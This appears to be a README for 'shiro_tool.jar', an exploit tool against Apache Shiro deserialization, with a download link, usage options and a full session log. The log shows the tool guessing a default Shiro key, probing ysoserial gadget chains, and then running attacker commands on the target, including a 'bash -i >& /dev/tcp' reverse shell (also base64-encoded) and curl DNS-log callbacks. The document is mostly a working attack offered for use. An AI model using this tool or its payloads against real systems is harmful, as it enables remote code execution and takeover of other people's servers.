# shiro_rce

```
下载地址：
2020-05-25:
https://xz.aliyun.com/forum/upload/affix/shiro_tool.zip

原来的停止服务了，请下载最新版本。


java -jar shiro_tool.jar https://xx.xx.xx.xx
nslookup/ping1/ping2/curl--> use nslookup dnslog.com check./use ping -c 1 dnslog.com check(default)./use ping -n 1 dnslog.com check./use curl dnslog.com check.
nocheck --> skip check target is shiro or not.
key= --> set a shiro key.
req= --> request body file 抓包保存到文件里，这里写文件名
keys= --> keys file  自定义key的文件，key按行分割，即每行写一个

[admin@ shiro]java -cp shiro_tool.jar Shiro https://xx.xx.xx.xx/          
[-] target: https://xx.xx.xx.xx/
[-] target is use shiro
[-] start guess shiro key.
[-] shiro key: kPH+bIxk5D2deZiIxcaaaA==
[-] check URLDNS
[*] find: URLDNS can be use
[-] check CommonsBeanutils1
[*] find: CommonsBeanutils1 can be use
[-] check CommonsCollections1
[-] check CommonsCollections2
[-] check CommonsCollections3
[-] check CommonsCollections4
[-] check CommonsCollections5
[-] check CommonsCollections6
[-] check CommonsCollections7
[-] check Groovy1
[*] find: Groovy1 can be use
[-] check JSON1
[*] find: JSON1 can be use
[-] check Spring1
[*] find: Spring1 can be use
[-] check Spring2
[-] check JRMPClient
[*] find: JRMPClient can be use
[*] JRMPClient please use: java -cp shiro_tool.jar ysoserial.exploit.JRMPListener 
0: URLDNS
1: CommonsBeanutils1
2: Groovy1
3: JSON1
4: Spring1
5: JRMPClient
[-] please enter the number(0-6)
3
[-] use gadget: JSON1
[*] command example: bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
[*] command example: curl dnslog.xx.com
[*] if need base64 command, input should startwith bash=/powershell=/python=/perl= 
[-] please enter command, input q or quit to quit
> curl json.dnslog.xx.cn
[-] start process command: curl json.dnslog.xx.cn
[-] please enter command, input q or quit to quit
> bash=bash -i >& /dev/tcp/xx.xx.xx.xx/80 0>&1
[-] start process command: bash -c {echo,YmFzaD1iYXNoIC1pID4mIC9kZXYvdGNwL3h4Lnh4Lnh4Lnh4LzgwIDA+JjE=}|{base64,-d}|{bash,-i}
[-] please enter command, input q or quit to quit
> quit
[-] start process command: quit
[-] quit

```
